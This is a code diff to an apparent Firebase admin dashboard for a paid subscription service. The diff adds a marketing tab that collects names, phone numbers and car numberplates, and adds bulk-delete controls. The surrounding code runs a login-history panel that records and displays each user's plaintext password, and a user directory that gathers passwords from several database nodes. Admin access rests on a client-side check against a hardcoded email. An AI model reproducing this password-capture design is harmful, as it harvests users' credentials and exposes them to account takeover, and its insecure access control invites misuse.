@@ -173,6 +173,7 @@ tr:hover { background: #fafafa; }
         <button class="tab-btn" onclick="switchTab('broadcastHub')">Broadcast Hub</button>
         <button class="tab-btn" onclick="switchTab('auditTracer')">Login & Activity History</button>
         <button class="tab-btn" onclick="switchTab('historyRequests')">History Requests</button>
+        <button class="tab-btn" onclick="switchTab('marketingRequests')">Marketing Requests</button>
         <button class="tab-btn" onclick="switchTab('stkConfig')">Master STK Config</button>
     </div>
 
@@ -197,7 +198,7 @@ tr:hover { background: #fafafa; }
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
                 <div>
                     <h2 style="font-size: 20px; font-weight: 800;">Support Tickets & User Inquiries</h2>
-                    <p style="font-size: 13px; color: var(--text-muted);">Manage and respond to active client support threads.</p>
+                    <p style="font-size: 13px; color: var(--text-muted);">Manage and respond to active client support threads instantly.</p>
                 </div>
                 <div style="display: flex; gap: 10px; align-items: center;">
                     <input type="text" id="ticketSearchBox" placeholder="Search ticket or UID..." onkeyup="filterTicketsTable()" style="padding: 8px 12px; border: 1px solid var(--border-color); border-radius: 8px; font-size: 12px; width: 220px;">
@@ -219,7 +220,7 @@ tr:hover { background: #fafafa; }
                             </tr>
                         </thead>
                         <tbody id="adminTicketsTableBody">
-                            <tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">Loading tickets...</td></tr>
+                            <tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">Loading tickets instantly...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -303,7 +304,7 @@ tr:hover { background: #fafafa; }
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
                 <div>
                     <h2 style="font-size: 20px; font-weight: 800;">Users Login & Activity History Stream</h2>
-                    <p style="font-size: 13px; color: var(--text-muted);">Every login event captured with exact timestamp, email, phone number, and password used.</p>
+                    <p style="font-size: 13px; color: var(--text-muted);">Every login event captured in real time with exact timestamp, email, phone number, and password used.</p>
                 </div>
                 <div>
                     <button class="btn-sm btn-danger" onclick="clearActivityLogs()">Clear Login & Audit Logs</button>
@@ -323,7 +324,7 @@ tr:hover { background: #fafafa; }
                             </tr>
                         </thead>
                         <tbody id="auditLogsTableBody">
-                            <tr><td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">Listening for user login history...</td></tr>
+                            <tr><td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">Listening for instant user login history...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -332,9 +333,14 @@ tr:hover { background: #fafafa; }
 
         <!-- TAB 5: HISTORY REQUESTS -->
         <div class="tab-panel" id="panel-historyRequests">
-            <div style="margin-bottom: 20px;">
-                <h2 style="font-size: 20px; font-weight: 800;">Chat History Retrieval Requests</h2>
-                <p style="font-size: 13px; color: var(--text-muted);">Users requesting to restore expired chat history. Accept or decline requests below.</p>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                <div>
+                    <h2 style="font-size: 20px; font-weight: 800;">Chat History Retrieval Requests</h2>
+                    <p style="font-size: 13px; color: var(--text-muted);">Users requesting to restore expired chat history. Accept or decline requests instantly below.</p>
+                </div>
+                <div>
+                    <button class="btn-sm btn-danger" onclick="deleteSelectedHistoryRequests()">Delete Selected</button>
+                </div>
             </div>
 
             <div class="card-box">
@@ -342,22 +348,56 @@ tr:hover { background: #fafafa; }
                     <table>
                         <thead>
                             <tr>
+                                <th style="width: 40px; text-align: center;"><input type="checkbox" id="selectAllHistoryReqs" onclick="toggleSelectAllHistoryReqs(this)"></th>
                                 <th>Time Requested</th>
                                 <th>User UID</th>
                                 <th>Reason / Note</th>
                                 <th>Status</th>
-                                <th>Decision Action</th>
+                                <th>Decision Action / Delete</th>
                             </tr>
                         </thead>
                         <tbody id="historyRequestsTableBody">
-                            <tr><td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">Loading history requests...</td></tr>
+                            <tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">Loading history requests instantly...</td></tr>
                         </tbody>
                     </table>
                 </div>
             </div>
         </div>
 
-        <!-- TAB 6: MASTER STK PUSH CONFIG -->
+        <!-- TAB 6: MARKETING REQUESTS -->
+        <div class="tab-panel" id="panel-marketingRequests">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                <div>
+                    <h2 style="font-size: 20px; font-weight: 800;">Marketing Requests (Name, Phone & Numberplate)</h2>
+                    <p style="font-size: 13px; color: var(--text-muted);">Review submitted entries capturing Name, Phone Number, and Car Numberplate.</p>
+                </div>
+                <div>
+                    <button class="btn-sm btn-danger" onclick="deleteSelectedMarketingRequests()">Delete Selected</button>
+                </div>
+            </div>
+
+            <div class="card-box">
+                <div class="table-responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th style="width: 40px; text-align: center;"><input type="checkbox" id="selectAllMarketing" onclick="toggleSelectAllMarketing(this)"></th>
+                                <th>Time Requested</th>
+                                <th>User UID</th>
+                                <th>Captured Details (Name, Phone, Numberplate)</th>
+                                <th>Status</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="marketingRequestsTableBody">
+                            <tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">Loading marketing requests instantly...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 7: MASTER STK PUSH CONFIG -->
         <div class="tab-panel" id="panel-stkConfig">
             <div style="margin-bottom: 20px;">
                 <h2 style="font-size: 20px; font-weight: 800;">Master M-Pesa Daraja & STK Push Configuration</h2>
@@ -445,6 +485,33 @@ tr:hover { background: #fafafa; }
         <div style="display: flex; gap: 10px; margin-top: 5px;">
             <button class="btn" style="background: #f1f5f9; color: var(--text-muted);" onclick="closeModal()">Cancel</button>
             <button class="btn btn-primary" onclick="submitAdminReply()">Send Reply & Update Status</button>
+        </div>
+    </div>
+</div>
+
+<!-- Marketing Request Edit Modal (Name, Phone, Numberplate) -->
+<div class="modal-overlay" id="marketingEditModal">
+    <div class="modal-card" style="max-width: 550px;">
+        <div class="modal-header">
+            <h3>Edit Marketing Request</h3>
+            <button onclick="closeMarketingEditModal()">✕</button>
+        </div>
+        <input type="hidden" id="editMarketingId">
+        <div class="form-group" style="margin-top:10px;">
+            <label>Name</label>
+            <input type="text" id="editMarketingName" placeholder="Full Name">
+        </div>
+        <div class="form-group">
+            <label>Phone Number</label>
+            <input type="text" id="editMarketingPhone" placeholder="Phone Number">
+        </div>
+        <div class="form-group">
+            <label>Car Numberplate</label>
+            <input type="text" id="editMarketingNumberplate" placeholder="Car Numberplate (e.g. KAA 000A)">
+        </div>
+        <div style="display: flex; gap: 10px; margin-top: 5px;">
+            <button class="btn" style="background: #f1f5f9; color: var(--text-muted);" onclick="closeMarketingEditModal()">Cancel</button>
+            <button class="btn btn-primary" onclick="saveMarketingEdit()">Save Changes</button>
         </div>
     </div>
 </div>
@@ -573,6 +640,8 @@ const auth = firebase.auth();
 
 let activeTicketsCache = {};
 let allAuditLogsCache = {};
+let allMarketingRequestsCache = {};
+let allHistoryRequestsCache = {};
 let userStatusesCache = {};
 let userPausesCache = {};
 let subscriptionsCache = {};
@@ -585,7 +654,7 @@ let adminHighlightedSnippet = null;
 let currentAdminUser = null;
 const SEVENTY_TWO_HOURS = 72 * 60 * 60 * 1000;
 
-// Capture Logged-In Admin State and Authorize
+// Capture Logged-In Admin State and Authorize instantly
 auth.onAuthStateChanged((user) => {
     if (user) {
         if (user.email && user.email.toLowerCase().trim() === "forexlin254@gmail.com") {
@@ -614,7 +683,8 @@ function switchTab(tabName) {
         'broadcastHub': 2,
         'auditTracer': 3,
         'historyRequests': 4,
-        'stkConfig': 5
+        'marketingRequests': 5,
+        'stkConfig': 6
     };
 
     const idx = tabMap[tabName] || 0;
@@ -627,6 +697,8 @@ function switchTab(tabName) {
         loadAuditLogs();
     } else if (tabName === 'historyRequests') {
         loadHistoryRequests();
+    } else if (tabName === 'marketingRequests') {
+        loadMarketingRequests();
     } else if (tabName === 'stkConfig') {
         loadMasterStkConfig();
     }
@@ -661,6 +733,7 @@ async function handleAdminLogin() {
 function showDashboard() {
     document.getElementById('loginWrapper').style.display = 'none';
     document.getElementById('adminDashboard').style.display = 'flex';
+    
     loadUserStatuses();
     loadSubscriptionsData();
     loadUsersNode();
@@ -669,6 +742,7 @@ function showDashboard() {
     loadAdminTickets();
     loadAuditLogs();
     loadHistoryRequests();
+    loadMarketingRequests();
     loadMasterStkConfig();
 }
 
@@ -689,6 +763,7 @@ function refreshData() {
     loadAdminTickets();
     loadAuditLogs();
     loadHistoryRequests();
+    loadMarketingRequests();
     loadMasterStkConfig();
     alert("Data synchronized with Firebase cloud successfully.");
 }
@@ -734,7 +809,7 @@ function loadSubscriptionPauses() {
 
 function loadAdminTickets() {
     const tbody = document.getElementById('adminTicketsTableBody');
-    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">Fetching cloud data...</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">Fetching cloud data instantly...</td></tr>`;
 
     rtdb.ref('support_tickets').on('value', (snapshot) => {
         if (!snapshot.exists()) {
@@ -754,7 +829,7 @@ function loadAdminTickets() {
 
 function loadAuditLogs() {
     const tbody = document.getElementById('auditLogsTableBody');
-    tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">Fetching login and activity history stream...</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">Listening for instant user login history stream...</td></tr>`;
 
     rtdb.ref('user_activity_logs').on('value', (snapshot) => {
         if (!snapshot.exists()) {
@@ -779,7 +854,6 @@ function loadAuditLogs() {
             const phone = log.phone || usersNodeCache[log.uid]?.phone || 'N/A';
             const password = log.password || usersNodeCache[log.uid]?.password || 'N/A';
 
-            // Check subscription status for Access Granted vs Not Subscribed
             const sub = subscriptionsCache[log.uid];
             const now = Date.now();
             let isSubscribed = false;
@@ -815,6 +889,158 @@ function loadAuditLogs() {
         tbody.innerHTML = html;
         loadUserDirectory();
     });
+}
+
+function loadMarketingRequests() {
+    const tbody = document.getElementById('marketingRequestsTableBody');
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">Fetching marketing requests instantly...</td></tr>`;
+
+    rtdb.ref('dispatches').on('value', (snapshot) => {
+        if (!snapshot.exists()) {
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">No marketing requests found.</td></tr>`;
+            allMarketingRequestsCache = {};
+            document.getElementById('selectAllMarketing').checked = false;
+            return;
+        }
+
+        allMarketingRequestsCache = snapshot.val();
+        let reqList = [];
+        for (let key in allMarketingRequestsCache) {
+            reqList.push({ id: key, ...allMarketingRequestsCache[key] });
+        }
+        reqList.sort((a, b) => {
+            const timeA = Number(a.timestamp || a.createdAt || a.time || a.date || 0);
+            const timeB = Number(b.timestamp || b.createdAt || b.time || b.date || 0);
+            return timeB - timeA;
+        });
+
+        document.getElementById('selectAllMarketing').checked = false;
+        let html = "";
+        reqList.forEach((req) => {
+            const rawTime = req.timestamp || req.createdAt || req.time || req.date || 0;
+            const timeVal = Number(rawTime);
+            const dateStr = !isNaN(timeVal) && timeVal > 0 ? new Date(timeVal).toLocaleString() : (rawTime ? String(rawTime) : "Unknown Time");
+            
+            const uidShort = req.uid ? req.uid.substring(0, 14) + "..." : "Marketing Team";
+            const status = req.status || 'Pending';
+
+            // Capturing Name, Phone Number, and Car Numberplate
+            const nameVal = req.name || req.campaignName || req.title || 'N/A';
+            const phoneVal = req.phone || req.phoneNumber || req.content || 'N/A';
+            const numberplateVal = req.carNumberplate || req.numberplate || req.details || 'N/A';
+
+            let statusBg = "#fef3c7; color: #d97706;";
+            if (status === "Approved" || status === "Settled") statusBg = "#dcfce7; color: #166534;";
+            else if (status === "Declined") statusBg = "#fee2e2; color: #991b1b;";
+
+            html += `
+                <tr>
+                    <td style="text-align: center;"><input type="checkbox" class="marketing-checkbox" value="${req.id}"></td>
+                    <td>${dateStr}</td>
+                    <td><code style="background:#f1f5f9; padding:2px 6px; border-radius:4px; font-size:11px;">${uidShort}</code></td>
+                    <td>
+                        <div style="font-weight: 700; color: var(--text-main);">Name: ${escapeHtml(nameVal)}</div>
+                        <div style="font-size: 12px; color: var(--text-muted); margin-top: 2px;">Phone: ${escapeHtml(phoneVal)}</div>
+                        <div style="font-size: 12px; color: var(--primary); font-weight: 700; margin-top: 2px;">Numberplate: ${escapeHtml(numberplateVal)}</div>
+                    </td>
+                    <td><span style="display:inline-block; padding:4px 10px; border-radius:6px; font-size:11px; font-weight:700; background:${statusBg}">${status}</span></td>
+                    <td>
+                        <div style="display:flex; gap:6px; flex-wrap:wrap; align-items:center;">
+                            <button class="btn-sm btn-success" onclick="updateMarketingRequestStatus('${req.id}', 'Approved')">Approve</button>
+                            <button class="btn-sm btn-danger" onclick="updateMarketingRequestStatus('${req.id}', 'Declined')">Decline</button>
+                            <button class="btn-sm btn-warning" onclick="openMarketingEditModal('${req.id}')">Edit</button>
+                            <button class="btn-sm btn-danger" onclick="deleteSingleMarketingRequest('${req.id}')" title="Delete record">Delete</button>
+                        </div>
+                    </td>
+                </tr>
+            `;
+        });
+        tbody.innerHTML = html;
+    });
+}
+
+function toggleSelectAllMarketing(source) {
+    const checkboxes = document.querySelectorAll('.marketing-checkbox');
+    checkboxes.forEach(cb => cb.checked = source.checked);
+}
+
+async function deleteSingleMarketingRequest(id) {
+    if (!confirm("Are you sure you want to delete this marketing request?")) return;
+    try {
+        await rtdb.ref('dispatches/' + id).remove();
+        alert("Marketing request deleted successfully.");
+    } catch (error) {
+        alert("Failed to delete request: " + error.message);
+    }
+}
+
+async function deleteSelectedMarketingRequests() {
+    const checkboxes = document.querySelectorAll('.marketing-checkbox:checked');
+    if (checkboxes.length === 0) {
+        alert("Please select at least one marketing request to delete.");
+        return;
+    }
+    if (!confirm(`Are you sure you want to delete ${checkboxes.length} selected marketing request(s)?`)) return;
+
+    const updates = {};
+    checkboxes.forEach(cb => {
+        updates['dispatches/' + cb.value] = null;
+    });
+
+    try {
+        await rtdb.ref().update(updates);
+        alert("Selected marketing requests deleted successfully.");
+    } catch (error) {
+        alert("Failed to delete requests: " + error.message);
+    }
+}
+
+async function updateMarketingRequestStatus(id, newStatus) {
+    try {
+        await rtdb.ref('dispatches/' + id).update({ status: newStatus, resolvedAt: Date.now() });
+        alert(`Marketing request successfully ${newStatus.toLowerCase()}.`);
+    } catch (error) {
+        alert("Failed to update marketing request: " + error.message);
+    }
+}
+
+function openMarketingEditModal(id) {
+    const req = allMarketingRequestsCache[id];
+    if (!req) return;
+    document.getElementById('editMarketingId').value = id;
+    document.getElementById('editMarketingName').value = req.name || req.campaignName || req.title || '';
+    document.getElementById('editMarketingPhone').value = req.phone || req.phoneNumber || req.content || '';
+    document.getElementById('editMarketingNumberplate').value = req.carNumberplate || req.numberplate || req.details || '';
+    document.getElementById('marketingEditModal').classList.add('active');
+}
+
+function closeMarketingEditModal() {
+    document.getElementById('marketingEditModal').classList.remove('active');
+}
+
+async function saveMarketingEdit() {
+    const id = document.getElementById('editMarketingId').value;
+    const name = document.getElementById('editMarketingName').value.trim();
+    const phone = document.getElementById('editMarketingPhone').value.trim();
+    const carNumberplate = document.getElementById('editMarketingNumberplate').value.trim();
+
+    if (!id || !name || !phone || !carNumberplate) {
+        alert("Please fill in Name, Phone Number, and Car Numberplate.");
+        return;
+    }
+
+    try {
+        await rtdb.ref('dispatches/' + id).update({
+            name: name,
+            phone: phone,
+            carNumberplate: carNumberplate,
+            updatedAt: Date.now()
+        });
+        alert("Marketing request updated successfully.");
+        closeMarketingEditModal();
+    } catch (error) {
+        alert("Failed to update marketing request: " + error.message);
+    }
 }
 
 function renderTicketsTable() {
@@ -925,7 +1151,6 @@ async function deleteSelectedTickets() {
     }
 }
 
-// Registered User Directory Aggregation (Scans ALL database nodes + extracts email, phone & password)
 function loadUserDirectory() {
     registeredUsersMap = {};
 
@@ -959,19 +1184,11 @@ function loadUserDirectory() {
         }
     };
 
-    // 1. Scan user_statuses
     for (let uid in userStatusesCache) addOrUpdateUser(uid);
-
-    // 2. Scan subscriptions
     for (let uid in subscriptionsCache) addOrUpdateUser(uid);
-
-    // 3. Scan users node
     for (let uid in usersNodeCache) addOrUpdateUser(uid, usersNodeCache[uid]);
-
-    // 4. Scan profiles node
     for (let uid in profilesNodeCache) addOrUpdateUser(uid, profilesNodeCache[uid]);
 
-    // 5. Scan activity logs
     for (let key in allAuditLogsCache) {
         const log = allAuditLogsCache[key];
         const uid = log.uid;
@@ -987,7 +1204,6 @@ function loadUserDirectory() {
         }
     }
 
-    // 6. Scan support tickets
     for (let key in activeTicketsCache) {
         const ticket = activeTicketsCache[key];
         const uid = ticket.uid;
@@ -1075,7 +1291,6 @@ async function updateUserAccountStatus(uid, newStatus) {
     }
 }
 
-// Detailed User Profile Popup Modal
 function openUserProfilePopup(uid) {
     currentSelectedProfileUid = uid;
     const user = registeredUsersMap[uid];
@@ -1297,25 +1512,35 @@ async function clearActivityLogs() {
 
 function loadHistoryRequests() {
     const tbody = document.getElementById('historyRequestsTableBody');
-    tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">Fetching history requests...</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">Fetching history requests instantly...</td></tr>`;
 
     rtdb.ref('history_requests').on('value', (snapshot) => {
         if (!snapshot.exists()) {
-            tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">No pending history retrieval requests.</td></tr>`;
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-muted);">No pending history retrieval requests.</td></tr>`;
+            allHistoryRequestsCache = {};
+            document.getElementById('selectAllHistoryReqs').checked = false;
             return;
         }
 
-        const requests = snapshot.val();
+        allHistoryRequestsCache = snapshot.val();
         let html = "";
         let reqList = [];
 
-        for (let key in requests) {
-            reqList.push({ id: key, ...requests[key] });
+        for (let key in allHistoryRequestsCache) {
+            reqList.push({ id: key, ...allHistoryRequestsCache[key] });
         }
-        reqList.sort((a, b) => b.timestamp - a.timestamp);
+        reqList.sort((a, b) => {
+            const timeA = Number(a.timestamp || a.createdAt || a.time || a.date || 0);
+            const timeB = Number(b.timestamp || b.createdAt || b.time || b.date || 0);
+            return timeB - timeA;
+        });
 
+        document.getElementById('selectAllHistoryReqs').checked = false;
         reqList.forEach((req) => {
-            const dateStr = req.timestamp ? new Date(req.timestamp).toLocaleString() : "Unknown Time";
+            const rawTime = req.timestamp || req.createdAt || req.time || req.date || 0;
+            const timeVal = Number(rawTime);
+            const dateStr = !isNaN(timeVal) && timeVal > 0 ? new Date(timeVal).toLocaleString() : (rawTime ? String(rawTime) : "Unknown Time");
+            
             const uidShort = req.uid ? req.uid.substring(0, 14) + "..." : "Anonymous";
             
             let statusBg = "#fef3c7; color: #d97706;";
@@ -1327,21 +1552,63 @@ function loadHistoryRequests() {
                 <button class="btn-sm btn-danger" onclick="updateHistoryRequestStatus('${req.id}', 'Declined')">Decline</button>
             `;
             if (req.status && req.status !== "Pending") {
-                actionButtons = `<span style="font-size:11px; font-weight:700; color:var(--text-muted);">Resolved</span>`;
+                actionButtons = `<span style="font-size:11px; font-weight:700; color:var(--text-muted); margin-right:6px;">Resolved</span>`;
             }
 
             html += `
                 <tr>
+                    <td style="text-align: center;"><input type="checkbox" class="history-checkbox" value="${req.id}"></td>
                     <td>${dateStr}</td>
                     <td><code style="background:#f1f5f9; padding:2px 6px; border-radius:4px; font-size:11px;">${uidShort}</code></td>
-                    <td>${escapeHtml(req.reason || "Request to restore expired chat history")}</td>
+                    <td>${escapeHtml(req.reason || req.content || req.message || "Request to restore expired chat history")}</td>
                     <td><span style="display:inline-block; padding:4px 10px; border-radius:6px; font-size:11px; font-weight:700; background:${statusBg}">${req.status || 'Pending'}</span></td>
-                    <td>${actionButtons}</td>
+                    <td>
+                        <div style="display:flex; gap:6px; align-items:center;">
+                            ${actionButtons}
+                            <button class="btn-sm btn-danger" onclick="deleteSingleHistoryRequest('${req.id}')">Delete</button>
+                        </div>
+                    </td>
                 </tr>
             `;
         });
         tbody.innerHTML = html;
     });
+}
+
+function toggleSelectAllHistoryReqs(source) {
+    const checkboxes = document.querySelectorAll('.history-checkbox');
+    checkboxes.forEach(cb => cb.checked = source.checked);
+}
+
+async function deleteSingleHistoryRequest(id) {
+    if (!confirm("Are you sure you want to delete this history request?")) return;
+    try {
+        await rtdb.ref('history_requests/' + id).remove();
+        alert("History request deleted successfully.");
+    } catch (error) {
+        alert("Failed to delete request: " + error.message);
+    }
+}
+
+async function deleteSelectedHistoryRequests() {
+    const checkboxes = document.querySelectorAll('.history-checkbox:checked');
+    if (checkboxes.length === 0) {
+        alert("Please select at least one history request to delete.");
+        return;
+    }
+    if (!confirm(`Are you sure you want to delete ${checkboxes.length} selected history request(s)?`)) return;
+
+    const updates = {};
+    checkboxes.forEach(cb => {
+        updates['history_requests/' + cb.value] = null;
+    });
+
+    try {
+        await rtdb.ref().update(updates);
+        alert("Selected history requests deleted successfully.");
+    } catch (error) {
+        alert("Failed to delete requests: " + error.message);
+    }
 }
 
 async function updateHistoryRequestStatus(requestId, newStatus) {
